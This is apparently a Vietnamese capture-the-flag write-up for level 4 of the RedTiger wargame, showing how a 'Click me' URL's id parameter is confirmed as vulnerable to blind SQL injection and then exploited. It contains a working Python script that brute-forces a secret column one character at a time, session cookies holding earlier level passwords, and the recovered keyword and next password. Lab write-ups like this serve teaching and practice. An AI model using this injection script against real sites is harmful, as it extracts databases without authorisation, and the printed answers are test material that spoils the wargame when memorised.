##BÁO CÁO level_4

-Đăng nhập vào đường dẫn `redtiger.labs.overthewire.org/level4.php`

-Klick vào `Click me`

-Ta sẽ được đường dẫn mới `http://redtiger.labs.overthewire.org/level4.php?id=1`

###1. Để biết nó có dính lỗi sql injection:

-Thử thêm vào sau nó 1 giá trị đúng và sai như sau:
	
	+ Với 'And 1=1' Thì trang sẽ không thay đổi 
	+ Với 'And 1=2' Thì trang không còn như ban đầu

	==> Chứng tỏ nó đã bị dính lỗi Blind SQL injection

**XEM THÊM ĐỂ BIẾT** : `http://voice0fblackhat.blogspot.com/2012/01/detailed-boolean-based-blind-injection.html`

###2. Cách khai thác:

-Sử dụng Python viết Code để truy vấn vào đoạn link Sql injection của mình và tìm ra pass

```sh
import urllib2
result=''
url1="http://redtiger.labs.overthewire.org/level4.php?id=1%20and%20ascii(substring((SELECT%20keyword%20FROM%20level4_secret)"
header={'Cookie': ' __cfduid=d1f7b235b221149a05ab3094a8200027e1483845382; __utma=176859643.1510925746.1483845385.1483845385.1483845385.1; __utmz=176859643.1483845385.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; level4login=there_is_no_bug'}
for i in range(1,27):
	flag=True
	for y in range (32,123):
		if (flag==False):	
			break
		url=url1+',{},1))={}'.format(i,y)
		truyvan=urllib2.Request(url=url,headers=header)
		source=urllib2.urlopen(truyvan).read()
		if  "1 rows" in source:
			result=result+chr(y)
			flag=False
print result

```

##Keyword thu được: `killstickswithbr1cks!`

##The password for the next level is: there_is_a_truck

	BÁO CÁO KẾT THÚC